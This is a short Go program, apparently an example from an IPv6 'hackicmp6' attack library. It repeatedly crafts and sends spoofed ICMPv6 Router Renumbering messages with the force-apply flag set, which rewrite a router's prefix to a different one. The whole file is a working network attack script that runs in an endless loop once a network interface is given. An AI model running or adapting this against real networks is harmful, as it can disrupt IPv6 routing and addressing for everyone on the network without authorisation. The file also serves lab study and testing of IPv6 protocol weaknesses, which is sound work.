// Router Renumbering example
package main

import (
	"fmt"
	"github.com/BobBurns/hackicmp6/hi6"
	"os"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("must specify interface!")
		os.Exit(-1)
	}
	t := hi6.ICMP6{
		Iface:  os.Args[1],
		SrcIP:  "2001:db8:210:3::a",
		DstIP:  "2001:db8:10:4::1",
		DstMAC: "c0:8c:60:bb:bb:bb",
		Type:        hi6.ICMPTypeRouterRenumbering,
		Code:        0,
		RR_Seqnum:   3,
		RR_Segnum:   0,
		RR_MaxDelay: 0,
		RR_Flags:    hi6.RR_FLAGS_FORCEAPPLY,
		RR_PCOMatch: hi6.PCOMatch{
			Code:     3,
			Ordinal:  0,
			MatchLen: 48,
			MinLen:   64,
			MaxLen:   64,
			Prefix:   "2001:db8:201:b::",
		},
	}
	pcoUse := hi6.PCOUse{
		UseLen:           48,
		KeepLen:          16,
		RA_Mask:          0xc0,
		RA_Flags:         0xc0,
		ValidLifetime:    9000,
		PreferedLifetime: 0,
		Prefix:           "2001:db8:202:b::",
	}
	t.AddPCOUse(pcoUse)

	for {
		fmt.Printf(".")
		err := t.BuildICMPPacket()
		if err != nil {
		fmt.Println("errors found...")
		fmt.Println(err)
		fmt.Println("exiting.")
		os.Exit(-1)
		}
		err = t.Send()
		if err != nil {
			fmt.Println(err)
			os.Exit(-1)
		}
		time.Sleep(time.Duration(1 * time.Second))
		t.RR_Seqnum += 1
	}

}
